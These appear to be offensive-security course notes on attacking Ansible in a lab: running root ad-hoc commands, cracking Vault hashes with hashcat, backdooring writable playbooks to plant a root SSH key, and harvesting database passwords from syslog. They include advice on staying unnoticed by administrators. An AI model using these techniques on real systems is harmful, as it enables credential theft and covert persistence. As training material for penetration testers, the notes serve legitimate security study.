# DevOps

DevOps is an overall strategy used to promote consistency and automation. In particular, DevOps applies to management of software builds, system changes, and infrastructure modifications. While a thorough exploration of DevOps is outside the scope of this module, it is helpful to recognize this trend toward increasing and improving process automation in modern companies.

DevOps technologies make traditional infrastructure and configuration tasks much more streamlined and efficient. They can quickly make configuration changes or system deployments that would have taken much more time. In some cases, these deployments are nearly instantaneous.

# Ansible
Ansible is an infrastructure configuration engine that enables IT personnel to dynamically and automatically configure IT infrastructure and computing resources. It works through a “push” model where the Ansible controller connects to registered “nodes” and runs “modules” on them.

Ansible modules are specialized Python scripts that are transported to the nodes by Ansible and then run to perform certain actions. This can be anything from gathering data to configuring settings or running commands and applications. After the scripts are run, artifacts from running the scripts are deleted and any data gathered by the script is returned to the controller.

In order for a machine to be part of the Ansible controller, the configuration `/etc/ansible/hosts` needs to list it as part of a group

This file lets ansible know what modules to run on specific groups or specific machines

For ansible to control a node, either the password of that user's SSH credentials need to be stored in the controller, or the controller’s Ansible account needs to be configured on the node using SSH

Since the account for Ansible controller in the node needs elevated privileges, compromise of it or even compromising the controller allows for complete control of the network

# Enumerating Ansible

To check if Ansible is running in the node:
```
ansible
```

Other indicators would be the `/etc/ansible` file path or `ansible` username in `/etc/passwd`

It may also be possible to detect Ansible-related log messages in the system’s syslog file.

# Ad-hoc Commands

Ad-hoc commands are not like playbooks, in the sense that they can be run only once for 1 or multiple machines or groups

You can run Ad-hoc commands with the `-a` flag for ansible:
```bash
ansibleadm@controller:~$ ansible victims -a "whoami"
...
linuxvictim | CHANGED | rc=0 >>
ansibleadm
```

You can also run commands as root with the `--become` flag:
```bash
ansibleadm@controller:~$ ansible victims -a "whoami" --become
...
linuxvictim | CHANGED | rc=0 >>
root
```

# Playbooks

Playbooks allow sets of tasks to be scripted so they can be run routinely at points in time. This is useful for combining various setup tasks, such as adding user accounts and settings to a new server or updating large numbers of machines at once.

Playbooks are written in YAML markup language. Set up playbooks in `/etc/playbooks`. The following example is for `getinfo.yml`:
```yaml
---
- name: Get system info
hosts: all
gather_facts: true
tasks:
- name: Display info
debug:
msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
```

The output of this using `ansible-playbook` would be:
```bash
ansibleadm@controller:/opt/playbooks$ ansible-playbook getinfo.yml
PLAY [Get system info] ***************************************************************
TASK [Gathering Facts] ***************************************************************
...
ok: [linuxvictim]
TASK [Display info] ******************************************************************
ok: [linuxvictim] => {
"msg": "The hostname is linuxvictim and the OS is Ubuntu"
}
PLAY RECAP ***************************************************************************
linuxvictim : ok=2 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0
```

# Exploiting Playbooks for Ansible Credentials

If stored playbooks on the controller are in a world-readable location or we have access to the folder they’re stored in, we can search for hardcoded credentials.

In some cases, it may be necessary or desirable for an administrator to avoid configuring a public key on a node machine. In this case, it’s possible for the administrator to run commands on the node using SSH usernames and passwords instead.

The following example creates a file called `written_by_ansible.txt` at `/opt/playbooks/writefile.yaml`:
```yaml
---
-   name: Write a file as offsec
	hosts: all
	gather_facts: true
	become: yes
	become_user: offsec
	vars:
		ansible_become_pass: lab
	tasks:
	- copy:
		content: "This is my offsec content"
		dest: "/home/offsec/written_by_ansible.txt"
		mode: 0644
		owner: offsec
		group: offsec
```

Now we verify if it worked:
```bash
ansibleadm@controller:/opt/playbooks$ ansible-playbook writefile.yaml
PLAY [Write a file as offsec]
****************************************************************
TASK [Gathering Facts]
***********************************************************************
ok: [linuxvictim]
TASK [copy]
**********************************************************************************
changed: [linuxvictim]
PLAY RECAP
***********************************************************************************
linuxvictim : ok=2 changed=1 unreachable=0 failed=0
skipped=0 rescued=0 ignored=0
```

Ansible does have `Ansible Vault` which securely stores credentials using a hashing format.

For example, the following file `/opt/playbooks/writefilevault.yaml` has a stored Ansible Vault hash:
```yaml
ansible_become_pass: !vault |
$ANSIBLE_VAULT;1.1;AES256
393636316139353262353832326166396132313036386537616661653361313139656630333132323736626166356263323964366533656633313230323964300a323838373031393362316534343863366234356236383736366262373331633362636237373835326637636135343131346437306435323132313130313534300a3837623663333036663631653839623563353836626437653138326632383036
```

We save this in our local kali machine, and use `/usr/share/john/ansible2john.py` to convert it to a hash format for cracking

```bash
kali@kali:~$ python3 /usr/share/john/ansible2john.py ./hash.yml
hash.yml:$ansible$0*0*9661a952b5822af9a21068e7afae3a119ef0312276baf5bc29d6e3ef312029d0*87b6c306f61e89b5c586bd7e182f2806*28870193b1e448c6b45b68766bb731c3bcb77852f7ca54114d70d52121101540
```

Then use hashcat with type `16900`:
```bash
kali@kali:~$ hashcat testhash.txt --force --hash-type=16900
/usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
...
* Device #1: Kernel amp_a0.7da82001.kernel not found in cache! Building may take a while...
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs
$ansible$0*0*9661a952b5822af9a21068e7afae3a119ef0312276baf5bc29d6e3ef312029d0*87b6c306f61e89b5c586bd7e182f2806*28870193b1e448c6b45b68766bb731c3bcb77852f7ca54114d70d52121101540:spongebob
...
```

Now we can use `ansible-vault decrypt` to decrypt any files encrypted with the original hash:
```bash
ansibleadm@controller:/opt/playbooks$ cat pw.txt
$ANSIBLE_VAULT;1.1;AES256
393636316139353262353832326166396132313036386537616661653361313139656630333132323736626166356263323964366533656633313230323964300a323838373031393362316534343863366234356236383736366262373331633362636237373835326637636135343131346437306435323132313130313534300a3837623663333036663631653839623563353836626437653138326632383036
ansibleadm@controller:/opt/playbooks$ cat pw.txt | ansible-vault decrypt
Vault password:
lab
Decryption successful
```

# Weak Permissions on Ansible Playbooks

If we have write access to a playbook, we may be able to exploit it by executing tasks we desire

The following example attempts to overwrite an existing playbook by adding our public key to `authorized_keys`:
```yaml
---
	- name: Get system info
	hosts: all
	gather_facts: true
	become: yes
	tasks:
		- name: Display info
			debug:
				msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
				
	- name: Create a directory if it does not exist
		file:
			path: /root/.ssh
			state: directory
			mode: '0700'
			owner: root
			group: root
	- name: Create authorized keys if it does not exist
		file:
			path: /root/.ssh/authorized_keys
			state: touch
			mode: '0600'
			owner: root
			group: root
			
	- name: Update keys
		lineinfile:
			path: /root/.ssh/authorized_keys
			line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
			insertbefore: EOF
```

Now we can log in through SSH as root on the machine:
```bash
kali@kali:~$ ssh root@linuxvictim
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64)
...
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.
root@linuxvictim:~#
```

We could completely overwrite the playbook if we wanted to, but that would change its intended functionality. This behavior is likely to be noticed by the administrator, especially if the playbook is run frequently. It’s much more discreet to keep the original functionality intact, tack on several new tasks, and add the become value to ensure the playbook is run as root.

There may be a situation where we want to run shell commands directly on the machine. To do this, we insert the commands we want to run in a command854 Ansible task in the getinfowritable.yaml playbook we used earlier:
```yaml
- name: Run command
	shell: touch /tmp/mycreatedfile.txt
	async: 10
	poll: 0
```

# Sensitive Data Leakage

Another way that Ansible can be useful for lateral movement is through sensitive data leaks. Although there are protections for credentials and sensitive data being used in module parameters in Ansible playbooks, some modules leak data to /var/log/syslog in the form of module parameters. This happens when the set of a module’s parameters are not fixed and can potentially change depending on how the module is being run.
```yaml
ansibleadm@controller:/opt/playbooks$ cat mysqlbackup.yml
---
	- name: Backup TPS reports
		hosts: linuxvictim
		gather_facts: true
		become: yes
		tasks:
	- name: Run command
		shell: mysql --user=root --password=hotdog123 --host=databaseserver --databases
		tpsreports --result-file=/root/reportsbackup
		async: 10
		poll: 0
```

When the Ansible administrator runs the playbook on the node (our linuxvictim machine), it attempts to connect to the MySQL server and dump the database. However, because of how it is executed, the playbook will log the shell command to syslog by default. An exception to this is when the no_log option is set to true in the playbook.

Login in to the that server and looking at the logs:
```bash
offsec@linuxvictim:~$ cat /var/log/syslog
...
Jun 8 13:29:10 linuxvictim ansible-command: Invoked with creates=None executable=None _uses_shell=True strip_empty_ends=True _raw_params=mysql --user=root --password=hotdog123 --host=databaseserver --databases tpsreports --resultfile=/root/reportsbackup removes=None argv=None warn=True chdir=None stdin_add_newline=True stdin=None
Jun 8 13:29:10 linuxvictim ansible-async_wrapper.py: Module complete (21772)
...